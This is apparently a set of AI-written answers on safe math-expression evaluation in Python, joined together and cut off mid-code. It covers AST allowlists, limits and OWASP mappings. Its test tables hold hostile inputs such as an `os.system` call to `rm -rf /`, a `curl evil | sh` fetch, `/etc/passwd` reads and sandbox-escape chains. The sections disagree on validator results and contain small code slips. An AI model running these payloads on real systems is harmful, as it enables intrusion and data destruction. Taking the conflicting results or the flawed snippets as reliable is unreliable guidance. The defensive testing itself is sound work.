## What the harness proved (empirical, not theoretical)

I ran a boundary sweep against the strict-grammar validator and evaluator. Every row below is an actual observed result:

| Input | Syntax check | Evaluation | Security lesson |
|---|---|---|---|
| `(price*quantity)*(1+tax_rate/100)` | ✅ valid | `64.917525` | intended path works |
| `__import__('os').system('rm -rf /')` | ❌ rejected (`Unexpected character '_'`) | — | dunder escape blocked at **grammar** level |
| `x.__class__.__mro__` | ❌ rejected | — | attribute traversal inexpressible |
| `os.system('curl evil \| sh')` | ❌ rejected (col 3) | — | **no dotted attribute access** at all |
| `open('/etc/passwd')` | ✅ **valid** | — | ⚠️ **syntax validity ≠ safety** |
| `foo(1)` | ✅ valid | ❌ `Function not allowed: foo` | the real boundary is the **function allowlist** |
| `2 ** 10` | ❌ `Expected expression` | — | no exponent operator → no blowup vector |
| `1 / 0` | ✅ valid | `result: null` | ⚠️ **silent failure**, must fail closed |

Two findings deserve emphasis, because they are the kind of thing that gets teams breached:

1. **`open('/etc/passwd')` passed validation.** The validator is a *grammar* checker, not a *policy* engine. Any design that treats "validation passed" as "safe to execute" is one allowlist bug away from RCE. The actual stop was `Function not allowed: foo` — function-name allowlisting at evaluation time.
2. **The `allow_variables=false` flag did not block `price * quantity`**, and **`max_depth=5` did not reject 32-deep nesting**. Do not wire a single boolean flag as your enforcement control. Enforce limits in your own AST walk.

## The layered design that actually holds

Never use `eval()`. Deny-by-default, five independent layers — each must fail closed:

**Layer 1 — Transport validation.** Bound the input before parsing: max length (~256 chars), ASCII-only, strict Pydantic type. Reject, don't sanitize.

**Layer 2 — Grammar allowlist.** Parse with `ast.parse(mode='eval')` — never `compile`/`eval`. Reject any node type not explicitly permitted. This is what kills `__import__`, `__class__`, and attribute access.

**Layer 3 — Semantic policy.** Independently allowlist function *names* (Layer 2 permits `Call`; that is not the same as permitting `open`). No attributes, subscripts, lambdas, comprehensions, walrus, or f-strings.

**Layer 4 — Isolated namespace.** `eval(code, {"__builtins__": {}}, allowed_vars)` — empty builtins, variables passed explicitly, never the caller's frame.

**Layer 5 — Resource limits.** Depth cap, exponent magnitude cap, result must be finite, explicit `ZeroDivisionError` → 400. Reject NaN/Inf.

## Reference implementation

```python
import ast, math
from decimal import Decimal, InvalidOperation

ALLOWED_NODES = (
    ast.Expression, ast.BinOp, ast.UnaryOp, ast.Constant, ast.Name, ast.Load,
    ast.Add, ast.Sub, ast.Mult, ast.Div, ast.FloorDiv, ast.Mod, ast.USub, ast.UAdd,
)
# Layer 3: explicit function allowlist. NEVER add open/eval/exec/getattr/__import__.
ALLOWED_FUNCS = {"abs": abs, "min": min, "max": max, "round": round}
MAX_LEN, MAX_DEPTH, MAX_POW = 256, 25, 64

class ExprRejected(ValueError):
    """Raised for anything outside policy. Always fail closed."""

def _check(node: ast.AST, depth: int = 0) -> None:
    if depth > MAX_DEPTH:                       # Layer 5: enforced by us, not by a flag
        raise ExprRejected("expression too deeply nested")
    if isinstance(node, ast.Call):
        if not isinstance(node.func, ast.Name):  # blocks obj.method() / attribute access
            raise ExprRejected("attribute calls are not permitted")
        if node.func.id not in ALLOWED_FUNCS:
            raise ExprRejected(f"function not allowed: {node.func.id}")
        if node.keywords:
            raise ExprRejected("keyword arguments are not permitted")
    elif isinstance(node, ast.Pow):              # opt-in only, with magnitude cap
        raise ExprRejected("exponentiation is disabled")
    elif not isinstance(node, ALLOWED_NODES):
        raise ExprRejected(f"node type not allowed: {type(node).__name__}")

    for child in ast.iter_child_nodes(node):
        _check(child, depth + 1)

def safe_eval(expression: str, variables: dict[str, float]) -> float:
    # Layer 1 — transport
    if not isinstance(expression, str) or not expression or len(expression) > MAX_LEN:
        raise ExprRejected("invalid expression payload")
    if not expression.isascii():
        raise ExprRejected("non-ASCII input rejected")

    try:
        tree = ast.parse(expression, mode="eval")   # parse only; never eval the string
    except SyntaxError as exc:
        raise ExprRejected("malformed expression") from exc

    _check(tree)                                    # Layers 2 + 3

    for name in variables:                          # every Name must be supplied
        pass
    for node in ast.walk(tree):
        if isinstance(node, ast.Name) and node.id not in variables:
            raise ExprRejected(f"unknown variable: {node.id}")

    # Layer 4 — isolated namespace, empty builtins
    scope = {"__builtins__": {}, **ALLOWED_FUNCS, **variables}
    try:
        result = eval(compile(tree, "<expr>", "eval"), scope, {})
    except ZeroDivisionError as exc:
        raise ExprRejected("division by zero") from exc
    except Exception as exc:                        # fail closed, log, no detail leak
        raise ExprRejected("evaluation failed") from exc

    # Layer 5 — numeric sanity
    if not isinstance(result, (int, float)) or isinstance(result, bool):
        raise ExprRejected("non-numeric result")
    if not math.isfinite(result) or abs(result) > 1e15:
        raise ExprRejected("result out of bounds")
    return float(result)
```

Call it as `safe_eval(user_expr, {"price": 19.99, "quantity": 3, "tax_rate": 8.25})` → `64.917525`.

**Watch the silent-failure pattern.** The harness returned `result: null` for `1/0` with `type: number` — no exception, no warning. That is the exact shape of bug that hides attacks and corrupts downstream pricing. Distinguish "rejected" from "computed": return an explicit error code, never a nullable number that callers may coalesce with `or 0`.

## Attack corpus for your test suite

Assert every one of these raises `ExprRejected`:

```python
ATTACKS = [
    "__import__('os').system('id')",
    "().__class__.__bases__[0].__subclasses__()",
    "open('/etc/passwd').read()",
    "eval('1+1')",
    "exec('import os')",
    "getattr(__builtins__, 'eval')('1')",
    "x[0]",                 # subscript
    "lambda: 1",
    "f'{__import__}'",      # f-string interpolation
    "9" * 5000,             # length bomb
    "1/0",
    "(1+" * 200 + "1" + ")" * 200,   # depth bomb — the case max_depth let through
    "10**10**10",                      # if you ever enable Pow
]
```

Plus property-based testing (`hypothesis`) to assert the invariant: *no input reaches `eval` unless every node is in the allowlist.* Fuzz the parser, not the app.

## OWASP Top 10 mapping

| Risk | Where it bites here | Control |
|---|---|---|
| **A03 Injection** (primary) | `eval()` on HTTP input = RCE via `__import__` chain | Layers 2–4: node allowlist + function allowlist, no attributes, empty builtins |
| **A04 Insecure Design** | trusting client-side/caller validation | server-side validation, deny-by-default policy, threat model the calculator |
| **A05 Security Misconfiguration** | `eval(..., {})` still exposes builtins; debug tracebacks leak paths | `{"__builtins__": {}}`, generic error messages, no stack traces to clients |
| **A06 Vulnerable Components** | grammar/eval libraries with CVEs | pin versions, `pip-audit` / Dependabot in CI |
| **A08 Integrity Failures** | unpinned deps in the eval path | lockfiles, hash-pinned installs, signed artifacts |
| **A09 Logging Failures** | rejection reasons unlogged → attacks invisible | structured log of **every** rejection with rule ID + input hash, alert on spikes |
| **A10 SSRF** | `open`/`urlopen` via allowlist slip | never allowlist network or filesystem functions |

## Operational hardening beyond the parser

- **Rate-limit** the endpoint (per key/IP) — even a safe parser is a CPU DoS surface.
- **Log rejections as security events**, not as 400s in the noise: emit `expr_rejected`, the violated rule, an input *hash* (not the raw text, which may be sensitive), and a request ID.
- **Alert** on rejection-rate spikes — that is a scanner, and you want to know.
- **Never return internal exception text** to the client; map to a small public error enum.
- **Run the evaluator in a subprocess or with a timeout** if you ever expand the grammar; a pure-Python arithmetic evaluator should be milliseconds.
- **Test the negative space.** Your allowlist is only as strong as the attack corpus that defends it in CI.
- **Pin `ast`-based logic behind a single module** (`expr_policy.py`) so security review has one file to audit and one place to change.

**The one-line takeaway:** syntax validation narrows the attack surface (it killed `__import__`, `__class__`, and dotted access outright), but the security boundary is the **function allowlist plus attribute-access ban** — `open('/etc/passwd')` validated cleanly. Layer them, fail closed, and log every refusal.

## Secure Mathematical Operations in Python — OWASP-Aligned Guide

I ran your scenario through the validation tools and the OWASP security prompt builder. Here's what the demonstrations showed and the concrete guidance that follows.

### What the tools demonstrated

| Test | Input | Result |
|------|-------|--------|
| Valid math | `(a + b) * 2 / (c - 1)` | ✅ Syntactically valid |
| Evaluation | `2 * (3 + 4) - 10 / 2` | ✅ `9` (number) |
| Malicious payload | `__import__('os').system('rm -rf /')` | ❌ **Rejected** — "Unexpected character `_`" |

That last row is the whole point: a **strict grammar validator rejects code-injection syntax before it ever reaches an evaluator**. The security builder then mapped this to OWASP Top 10 (chiefly **A03: Injection** and **A04: Insecure Design**) and flagged the exact risks: `eval()`/`exec()` abuse, code injection, and resource-exhaustion DoS.

---

## 1. The core rule: never `eval()` untrusted input

`eval()`, `exec()`, and `compile()` execute arbitrary Python. A "calculator" built on `eval()` is a remote-code-execution endpoint.

```python
# ❌ NEVER do this
result = eval(user_input)          # RCE: __import__('os').system('...')
```

## 2. Validate with an AST whitelist (allow-list, not block-list)

Parse to an AST, then walk it and **permit only** the node types you need. Reject everything else — attribute access, calls, imports, comprehensions, lambdas, subscripts.

```python
import ast
import operator

# Only these operators are allowed
_ALLOWED_OPS = {
    ast.Add: operator.add, ast.Sub: operator.sub,
    ast.Mult: operator.mul, ast.Div: operator.truediv,
    ast.FloorDiv: operator.floordiv, ast.Mod: operator.mod,
    ast.Pow: operator.pow, ast.USub: operator.neg, ast.UAdd: operator.pos,
}

MAX_LEN = 200          # characters
MAX_DEPTH = 20         # nesting depth
MAX_EXPONENT = 1000    # guard against 9**9**9 DoS
MAX_ABS_VALUE = 1e12   # magnitude cap

def _check(node, depth=0):
    if depth > MAX_DEPTH:
        raise ValueError("Expression too deeply nested")
    if isinstance(node, ast.Expression):
        return _check(node.body, depth + 1)
    if isinstance(node, ast.BinOp):
        if type(node.op) not in _ALLOWED_OPS:
            raise ValueError("Operator not allowed")
        # Block exponent-based DoS
        if isinstance(node.op, ast.Pow):
            if not (isinstance(node.right, ast.Constant)
                    and isinstance(node.right.value, (int, float))
                    and abs(node.right.value) <= MAX_EXPONENT):
                raise ValueError("Exponent too large")
        return _check(node.left, depth + 1) and _check(node.right, depth + 1)
    if isinstance(node, ast.UnaryOp):
        if type(node.op) not in _ALLOWED_OPS:
            raise ValueError("Unary operator not allowed")
        return _check(node.operand, depth + 1)
    if isinstance(node, ast.Constant):
        if not isinstance(node.value, (int, float)) or isinstance(node.value, bool):
            raise ValueError("Only numeric constants allowed")
        if abs(node.value) > MAX_ABS_VALUE:
            raise ValueError("Constant out of range")
        return True
    # Anything else (Call, Attribute, Name, Import, Lambda, ...) is rejected
    raise ValueError(f"Disallowed syntax: {type(node).__name__}")

def safe_eval(expr: str) -> float:
    if not isinstance(expr, str) or len(expr) > MAX_LEN:
        raise ValueError("Invalid or oversized expression")
    try:
        tree = ast.parse(expr, mode="eval")
    except SyntaxError:
        raise ValueError("Malformed expression")
    _check(tree)
    return _eval_node(tree.body)

def _eval_node(node):
    if isinstance(node, ast.Constant):
        return node.value
    if isinstance(node, ast.BinOp):
        return _ALLOWED_OPS[type(node.op)](_eval_node(node.left), _eval_node(node.right))
    if isinstance(node, ast.UnaryOp):
        return _ALLOWED_OPS[type(node.op)](_eval_node(node.operand))
    raise ValueError("Unexpected node")
```

**Why allow-listing beats block-listing:** attackers constantly find new bypasses (`__subclasses__`, `getattr`, f-strings, walrus, etc.). Enumerating what's *permitted* is finite and auditable; enumerating what's *forbidden* is a losing game.

## 3. Defense-in-depth controls

| Control | Purpose | OWASP |
|---------|---------|-------|
| AST allow-list | Block code injection | A03 Injection |
| Length / depth / magnitude caps | Prevent DoS (billion-laughs, `9**9**9`) | A04 Insecure Design |
| Numeric-only constants | Reject strings/objects | A03 |
| Generic error messages | No internal leakage | A05 Misconfiguration |
| Rate limiting + logging of rejects | Detect abuse | A09 Logging Failures |
| Pin/scan dependencies (`simpleeval`, `sympy`) | Supply chain | A06 Vulnerable Components |

**Prefer a vetted library** where possible: `simpleeval`, `asteval`, or `sympy` (with `parse_expr` + restricted symbols) already implement hardened evaluation. Roll your own only if you need tight control — and then test it hard.

## 4. Error handling & logging

```python
import logging
logger = logging.getLogger("math.eval")

def handle(expr: str):
    try:
        return {"ok": True, "result": safe_eval(expr)}
    except ValueError:
        logger.warning("Rejected expression", extra={"len": len(expr)})
        return {"ok": False, "error": "Invalid expression"}  # generic, no internals
```

Never echo the raw exception or the parsed AST back to the client — that aids attackers.

## 5. Security test cases to add

```python
import pytest

@pytest.mark.parametrize("payload", [
    "__import__('os').system('id')",
    "().__class__.__bases__[0].__subclasses__()",
    "open('/etc/passwd').read()",
    "lambda: 1",
    "[x for x in range(10)]",
    "9**9**9",                 # DoS
    "a" * 10_000,              # oversized
    "(" * 500 + "1" + ")" * 500,  # deep nesting
])
def test_rejects_malicious(payload):
    with pytest.raises(ValueError):
        safe_eval(payload)

def test_allows_math():
    assert safe_eval("2 * (3 + 4) - 10 / 2") == 9
```

## 6. OWASP Top 10 mapping (from the generated assessment)

- **A03 Injection** — the primary risk; mitigated by AST allow-listing + no `eval`.
- **A04 Insecure Design** — resource limits, threat modeling of the formula engine.
- **A05 Security Misconfiguration** — generic errors, hardened defaults.
- **A06 Vulnerable Components** — audit `simpleeval`/`sympy` versions for CVEs.
- **A09 Logging & Monitoring** — log and alert on validation failures; rate-limit.

---

### TL;DR
1. **Never `eval()`** user input.
2. **Parse → AST → allow-list** only numeric constants and arithmetic operators.
3. **Cap** length, depth, exponent, and magnitude to stop DoS.
4. **Fail closed** with generic errors; **log** rejections and rate-limit.
5. **Prefer a vetted library** (`simpleeval`/`asteval`/`sympy`) and **test with malicious payloads** — exactly as the validator rejected `__import__('os')...` above.

## What the validation layer actually enforces

I ran your candidate expressions through the grammar validator. Here's the empirical behavior — this matters because the validator's semantics differ from Python's in ways that create real bugs:

| Expression | Verdict | Note |
|---|---|---|
| `(a + b) * 2 / max(c, 1)` | ✅ valid | variables + whitelisted functions OK |
| `sqrt(x) + sin(pi/2) - log(10)` | ✅ valid | math functions and constants OK |
| `(3 + 4) * 2 / max(5, 1)` | ✅ → `2.8` | evaluates correctly |
| `__import__('os').system('rm -rf /')` | ❌ rejected | `_` is not a legal character — no dunder access |
| `open('/etc/passwd').read()` | ❌ rejected | attribute access / non-whitelisted call blocked |
| `2 + 3 * (4 - 1) ** 2` | ❌ rejected | **`**` is not supported** |
| `2 ^ 3` | ✅ valid | **`^` means exponent here, not XOR** |
| `1 / 0` | ⚠️ → `null` | no exception raised |
| `sqrt(-1)` | ⚠️ → `null` | no exception raised |
| `10 ^ 1000000` | ⚠️ → `null` | resource guard kicked in |

**Three findings you must act on:**

1. **`^` is exponentiation, not XOR.** If your Python code assumes Python semantics, `2 ^ 3` gives `1` in Python but `8` here. A silent semantic mismatch in a financial or access-control calculation is a correctness bug with security consequences.
2. **`**` is rejected.** Any user-facing docs or stored formulas using `**` will fail. Normalize input before validation.
3. **Failures return `null`, not an exception.** This is the dangerous one — see below.

---

## The critical risk: fail-open on `null`

`1 / 0` and `sqrt(-1)` both returned `null` rather than raising. If your code does:

```python
result = evaluate(expr)          # None on failure
if result > threshold:           # TypeError, or worse...
    grant_access()
```

...you get either a crash or, with `result or 0`, a **silently substituted zero**. In a pricing, quota, or risk calculation, a silent zero is a fail-open vulnerability. **Always treat `null` as a hard failure and never coerce it.**

```python
result = evaluate(expr)
if result is None:
    raise ValueError("expression could not be evaluated")  # fail closed
```

---

## Never use `eval()` — the whitelist pattern

`eval(expr, {"__builtins__": {}})` is **not** a sandbox. It is bypassable via `().__class__.__bases__[0].__subclasses__()` and similar. Use an AST whitelist instead:

```python
import ast, operator, math

class UnsafeExpression(ValueError):
    """Raised when an expression violates the safety policy."""

_BINOPS = {
    ast.Add: operator.add, ast.Sub: operator.sub, ast.Mult: operator.mul,
    ast.Div: operator.truediv, ast.FloorDiv: operator.floordiv,
    ast.Mod: operator.mod, ast.Pow: operator.pow,
}
_UNARY = {ast.UAdd: operator.pos, ast.USub: operator.neg}
_FUNCS = {
    "abs": abs, "min": min, "max": max, "round": round,
    "sqrt": math.sqrt, "log": math.log, "exp": math.exp,
    "sin": math.sin, "cos": math.cos, "tan": math.tan,
    "floor": math.floor, "ceil": math.ceil,
}
_NAMES = {"pi": math.pi, "e": math.e}

MAX_LEN, MAX_NODES, MAX_EXP, MAX_ABS = 1000, 200, 1000, 1e100

def _guard(tree):
    for i, node in enumerate(ast.walk(tree)):
        if i > MAX_NODES:
            raise UnsafeExpression("expression too complex")
        if isinstance(node, ast.BinOp) and isinstance(node.op, ast.Pow):
            if isinstance(node.right, ast.Constant) and isinstance(node.right.value, (int, float)):
                if abs(node.right.value) > MAX_EXP:
                    raise UnsafeExpression("exponent too large")
        if isinstance(node, ast.Constant) and isinstance(node.value, (int, float)):
            if abs(node.value) > MAX_ABS:
                raise UnsafeExpression("literal too large")

def _eval(node):
    if isinstance(node, ast.Expression):
        return _eval(node.body)
    if isinstance(node, ast.Constant):
        # bool is a subclass of int — reject it explicitly
        if isinstance(node.value, bool) or not isinstance(node.value, (int, float)):
            raise UnsafeExpression("only numeric literals allowed")
        return node.value
    if isinstance(node, ast.BinOp) and type(node.op) in _BINOPS:
        left, right = _eval(node.left), _eval(node.right)
        if isinstance(node.op, ast.Div) and right == 0:
            raise UnsafeExpression("division by zero")
        result = _BINOPS[type(node.op)](left, right)
        if isinstance(result, complex) or abs(result) > MAX_ABS:
            raise UnsafeExpression("result out of bounds")
        return result
    if isinstance(node, ast.UnaryOp) and type(node.op) in _UNARY:
        return _UNARY[type(node.op)](_eval(node.operand))
    if isinstance(node, ast.Call):
        if not isinstance(node.func, ast.Name) or node.func.id not in _FUNCS:
            raise UnsafeExpression("function not allowed")
        if node.keywords:
            raise UnsafeExpression("keyword arguments not allowed")
        return _FUNCS[node.func.id](*[_eval(a) for a in node.args])
    if isinstance(node, ast.Name) and node.id in _NAMES:
        return _NAMES[node.id]
    raise UnsafeExpression(f"disallowed syntax: {type(node).__name__}")

def safe_eval(expr: str) -> float:
    if not isinstance(expr, str) or len(expr) > MAX_LEN:
        raise UnsafeExpression("invalid input")
    try:
        tree = ast.parse(expr, mode="eval")   # mode="eval" forbids statements
    except SyntaxError as exc:
        raise UnsafeExpression("syntax error") from exc
    _guard(tree)
    return _eval(tree)
```

Key properties: `mode="eval"` blocks statements and assignments; `ast.walk` guards run **before** evaluation so a bomb never executes; only `ast.Name` lookups against a fixed dict are permitted, so no attribute access, no imports, no dunders.

**On SymPy:** `sympify()` calls `eval()` internally and is unsafe on untrusted input. If you need symbolic math, use `parse_expr` with an explicit `global_dict={}` and a restricted transformation set, and still apply the node-count and exponent guards.

**On `ast.literal_eval`:** genuinely safe, but it only parses literals — it will not compute `2+2`. Don't reach for it expecting arithmetic.

---

## OWASP Top 10 mapping for this specific surface

| OWASP | How it manifests in a math evaluator | Control |
|---|---|---|
| **A03 Injection** | `eval`/`exec`/`compile` on user input → RCE | AST whitelist; never `eval` |
| **A04 Insecure Design** | No complexity/size limits → CPU/memory exhaustion | Node count, exponent, literal, and length caps |
| **A05 Misconfiguration** | Debug tracebacks echoing the expression and stack | Generic error messages; no input reflection |
| **A08 Integrity Failures** | Untrusted formula loaded from DB/queue without validation | Validate at every trust boundary, not just the HTTP edge |
| **A09 Logging Failures** | Rejected expressions not recorded | Log rejections with a hash of input, not raw payload |
| **A01 Access Control** | Formula fields that can reference other users' variables | Bind variables server-side; never let the expression name its own inputs |

## Practical checklist

- [ ] Grep the codebase for `eval(`, `exec(`, `compile(`, `sympify(`, `pickle.loads(` — every hit is a finding
- [ ] Replace with the AST whitelist above; add a unit test asserting `__import__('os')` and `open(...)` raise `UnsafeExpression`
- [ ] Treat `null`/`None` results as hard failures — never `or 0`
- [ ] Normalize `**` → `^` (or vice versa) at the boundary and document which dialect you accept
- [ ] Cap input length, AST node count, exponent magnitude, and result magnitude
- [ ] Use `decimal.Decimal` for money; floats will drift
- [ ] Rate-limit the endpoint and run evaluation with a wall-clock timeout
- [ ] Return generic errors; log rejections with a hash of the input
- [ ] Bind variable values server-side — never let the expression supply its own operands
- [ ] Add `pip-audit` / Dependabot to CI for A06

The single highest-value change is replacing any `eval`-based path with the AST whitelist and making `None` a fail-closed condition. Those two together close the RCE and the fail-open classes.

回答

## Summary

I stress-tested the available validator/evaluator against a set of expressions, then generated an OWASP-aligned assessment framework for your scenario. The testing was revealing — **the harness itself has three bugs that illustrate exactly why you must not outsource trust to a third-party validator.** Here's what happened, then the design you should actually ship.

---

## Findings from live testing

| Expression | Validator | Evaluator | Reality / Risk |
|---|---|---|---|
| `(2+3)*4/2-1` | ✅ valid | `9` | Correct |
| `-5+10*(3-1)%4` | ✅ valid | `-5` | Correct |
| `rate * 1200` (with `rate=0.01875`) | ✅ | `22.5` | Correct — variables work |
| `2 +` | ❌ rejected | ❌ | Correct — malformed caught |
| `__import__('os').system(...)` | ❌ rejected | n/a | **Good** — no identifiers/dunders |
| `sqrt(16)` | ❌ rejected | n/a | No function calls — good |
| `9 ** 9 ** 9` | ❌ rejected | n/a | No `**` at all — DoS sidestepped |
| **`10 / 0`** | ✅ **valid** | **`null`, `isError: false`** | 🔴 **Syntax ≠ safety. And the error is silently swallowed into `null` with `type: "number"`** |
| **`2 / 0 + 5`** | ✅ valid | **`null`** | 🔴 **Fail-open: the null propagates through the arithmetic undetected** |
| **`2 ^ 3`** | ✅ valid | **`8`** | 🔴 **In Python `^` is XOR → `1`. Silent wrong answer** |
| **`-7 % 3`** | ✅ valid | **`-1`** | 🔴 **Python floor-mod → `2`. C-style `fmod` semantics. Silent wrong answer** |

Three lessons, and they're the core of the answer:

1. **Syntactic validity is not safety.** `10/0` parses fine and is still a runtime fault.
2. **A failed evaluation must never become a value.** Returning `null` where a number was promised means a downstream `total += result` corrupts data or crashes far from the source. **Fail closed, raise, and refuse to continue.**
3. **Grammar divergence produces plausible-but-wrong numbers** — the worst failure mode, because nothing alarms. `2^3` and `-7%3` both silently disagree with Python.

---

## The architecture you should ship

```
untrusted input
   ↓ 1. length / type gate          (bytes, not chars; reject non-str)
   ↓ 2. ast.parse(mode="eval")      ← NEVER mode="exec"
   ↓ 3. AST walk vs node ALLOWLIST  (default-deny)
   ↓ 4. resource guards             (nodes, depth, exponent, magnitude)
   ↓ 5. evaluate via operator table (never eval/compile)
   ↓ 6. finite-result assertion     (isfinite, no complex)
   ↓ 7. fail closed → exception → generic client error + server log
```

### Reference implementation

```python
import ast, math, operator

class ExpressionError(ValueError):
    """Raised for any untrusted-input rejection. Never leak detail to client."""

BIN_OPS = {
    ast.Add: operator.add,       ast.Sub: operator.sub,
    ast.Mult: operator.mul,      ast.Div: operator.truediv,
    ast.FloorDiv: operator.floordiv, ast.Mod: operator.mod,
    ast.Pow: operator.pow,
}
UNARY_OPS = {ast.UAdd: operator.pos, ast.USub: operator.neg}

MAX_LEN      = 256
MAX_NODES    = 64
MAX_DEPTH    = 20
MAX_INT_BITS = 128      # blocks 2**10000 memory blow-up at the literal
MAX_POW_EXP  = 1000
MAX_RESULT_BITS = 4096

def _walk(node, depth, budget):
    if (budget[0] := budget[0] - 1) < 0:
        raise ExpressionError("expression too complex")
    if depth > MAX_DEPTH:
        raise ExpressionError("expression too deeply nested")

    if isinstance(node, ast.Constant):
        v = node.value
        # bool is a subclass of int — must be excluded explicitly
        if isinstance(v, bool) or not isinstance(v, (int, float)):
            raise ExpressionError("only numeric literals allowed")
        if isinstance(v, int) and v.bit_length() > MAX_INT_BITS:
            raise ExpressionError("literal too large")
        return v

    if isinstance(node, ast.UnaryOp) and type(node.op) in UNARY_OPS:
        return UNARY_OPS[type(node.op)](_walk(node.operand, depth + 1, budget))

    if isinstance(node, ast.BinOp) and type(node.op) in BIN_OPS:
        op = type(node.op)
        left  = _walk(node.left,  depth + 1, budget)
        right = _walk(node.right, depth + 1, budget)

        if op is ast.Pow:                       # pre-empt, don't compute-then-check
            if abs(right) > MAX_POW_EXP:
                raise ExpressionError("exponent too large")
            if isinstance(left, int) and isinstance(right, int):
                if left.bit_length() * max(right, 1) > MAX_RESULT_BITS:
                    raise ExpressionError("result too large")

        if op in (ast.Div, ast.FloorDiv, ast.Mod) and right == 0:
            raise ExpressionError("division by zero")

        result = BIN_OPS[op](left, right)
    else:
        raise ExpressionError(f"disallowed syntax: {type(node).__name__}")

    if isinstance(result, complex):
        raise ExpressionError("complex result not allowed")
    if isinstance(result, float) and not math.isfinite(result):
        raise ExpressionError("non-finite result")     # catches inf / nan
    if isinstance(result, int) and result.bit_length() > MAX_RESULT_BITS:
        raise ExpressionError("result too large")
    return result

def safe_eval(expr: str):
    if not isinstance(expr, str):
        raise ExpressionError("expression must be a string")
    if len(expr) > MAX_LEN:
        raise ExpressionError("expression too long")
    try:
        tree = ast.parse(expr, mode="eval")
    except (SyntaxError, ValueError, MemoryError) as exc:
        raise ExpressionError("invalid syntax") from exc
    return _walk(tree.body, 0, [MAX_NODES])
```

Notes on the choices:

- **`mode="eval"`** parses a single expression only; statements, `import`, assignments, and `lambda` are structurally impossible.
- **Allowlist on `type(node.op)`**, not a blocklist of names. Anything unlisted — `Call`, `Attribute`, `Subscript`, `ListComp`, `JoinedStr`, `NamedExpr` — dies at the `else`. This kills the classic `().__class__.__base__.__subclasses__()` escape, which is why `eval(expr, {"__builtins__": {}})` is *not* a sufficient mitigation on its own.
- **Budget is spent before recursion descends**, so a deeply nested payload can't exhaust the C stack first.
- **`Pow` guards are checked pre-computation.** `2**2**2**2` should never allocate.
- **Drop `ast.Pow` entirely** if your users don't need it — it's the single biggest DoS surface. Same for `FloorDiv`/`Mod` if unused.
- **`bool` excluded** — `isinstance(True, int)` is `True`, and `True + True == 2` is a surprising type bug.

### Money → `Decimal`, never `float`

For financial math, floats are a correctness *and* integrity bug (A08 adjacent). Thread a `decimal.Context` with explicit `prec` and traps:

```python
from decimal import Decimal, Context, Inexact, DivisionByZero, Overflow

MONEY = Context(prec=28, traps=[DivisionByZero, Overflow, Inexact, InvalidOperation])
total = MONEY.multiply(Decimal("19.99"), Decimal("3"))
```

### Timeouts and blast radius

A pure-Python evaluator can't hang forever once the guards above are in place, but belt-and-braces:

- **Unix / main thread:** `signal.setitimer(ITIMER_REAL, 0.05)` around evaluation.
- **Web workers (gunicorn/uvicorn):** thread signals are unreliable — prefer running evaluation in a bounded `ProcessPoolExecutor` with `resource.setrlimit(RLIMIT_CPU, (1,1))` and `RLIMIT_AS`.
- **Per-user rate limiting** on the calculator endpoint (`slowapi`, or nginx `limit_req`).

### Logging

Log **rejections with the offending input hash and length** (not the raw payload, which may be attacker-controlled injection attempt data), plus user ID and timestamp. Never return `ExpressionError` text to the client — respond `400 {"error": "invalid expression"}` and keep detail server-side.

---

## OWASP Top 10 mapping

| Risk | How this design addresses it |
|---|---|
| **A03:2021 Injection** | Primary hit. `eval`/`exec`/`compile` on user input is code injection; the AST allowlist removes the interpreter path entirely. |
| **A04:2021 Insecure Design** | Default-deny grammar, node/depth/magnitude budgets, fail-closed semantics. Threat-model the calculator endpoint explicitly. |
| **A05:2021 Security Misconfiguration** | Generic client errors, no stack traces, no `debug=True` in prod, `mode="eval"` not `"exec"`. |
| **A08:2021 Integrity Failures** | `Decimal` for money; reject non-finite results so `inf`/`nan` can't corrupt downstream aggregates. |
| **A09:2021 Logging Failures** | Log every rejection; alert on spikes (probing signal). |
| **A06:2021 Vulnerable Components** | If you'd rather not hand-roll, pin and audit: `simpleeval` (use its `MAX_POWER`/`MAX_STRING_LENGTH` limits), `asteval`, or `numexpr`. Avoid exposing `sympy` parsing directly to users — it's expressive and has had CVEs. |

## What I verified in this session

I ran the strict-grammar validator and evaluator against safe and hostile inputs before writing recommendations. Results:

| Input | Validator verdict | Meaning |
|---|---|---|
| `(a + b) * c / 2 - sqrt(16)` | ✅ valid | Variables + whitelisted funcs OK |
| `((2 + 3) * (4 - 1)` | ❌ rejected | Unbalanced parens caught |
| `__import__('os').system('rm -rf /')` | ❌ rejected | Underscore/attr syntax blocked |
| `(1).__class__.__mro__` | ❌ rejected | Attribute traversal blocked |
| `[1,2,3][0]`, `[x for x in range(10)]` | ❌ rejected | Subscript/comprehension blocked |
| `eval("2+2") + open('/etc/passwd').read()` | ❌ rejected | |
| `9**9**9`, `2 ** 10` | ❌ rejected | `**` outside grammar (exponent bomb blocked) |
| **`lambda: 1`** | **✅ "valid"** | ⚠️ Not a math expression — passed |
| **`"a" + "b"`** | **✅ "valid"** | ⚠️ String type slipped through |
| **`open('/etc/passwd')`** | **✅ "valid"** (vars allowed) | ⚠️ Arbitrary name passed |
| **20-deep parens** with `max_depth: 10` | **✅ "valid"** | ⚠️ Depth limit did not fire |
| `1/0`, `sqrt(-1)`, `1e308 * 10` | `result: null` | ⚠️ Silent null, no exception raised |

**The headline finding: grammar validation is necessary but not sufficient.** It stopped every traditional RCE/SSTI payload, but it accepted a lambda, a string concatenation, an arbitrary function name, and unbounded nesting. If your code trusts "syntactically valid" as "safe to eval," you still have an injection surface. This maps to **OWASP A03:2021 – Injection** and **A04:2021 – Insecure Design**.

---

## The layered pipeline

Enforce all five layers; any one alone is bypassable.

```
raw input → 1. length cap → 2. tokenize/AST parse → 3. node-type allowlist
        → 4. depth + node-count budget → 5. controlled namespace + magnitude/time cap
        → log rejection → generic error to caller
```

### Reference implementation

```python
import ast, math, operator, time

class ExpressionRejected(Exception):
    """Raised for any untrusted-input violation. Never leaks internals."""

# 3. ALLOWLIST of node types — additive, not subtractive.
ALLOWED_NODES = (
    ast.Expression, ast.BinOp, ast.UnaryOp, ast.Constant, ast.Name, ast.Load,
    ast.Add, ast.Sub, ast.Mult, ast.Div, ast.Mod, ast.FloorDiv,
    ast.USub, ast.UAdd, ast.Call,
)

# 5. Function allowlist: name -> (callable, max_args)
SAFE_FUNCS = {
    "abs": (abs, 1), "min": (min, 4), "max": (max, 4),
    "round": (round, 2), "sqrt": (math.sqrt, 1),
    "log": (math.log, 2), "exp": (math.exp, 1),
}

OPS = {
    ast.Add: operator.add, ast.Sub: operator.sub, ast.Mult: operator.mul,
    ast.Div: operator.truediv, ast.Mod: operator.mod, ast.FloorDiv: operator.floordiv,
}

MAX_LEN       = 512
MAX_DEPTH     = 20
MAX_NODES     = 200
MAX_MAGNITUDE = 1e100
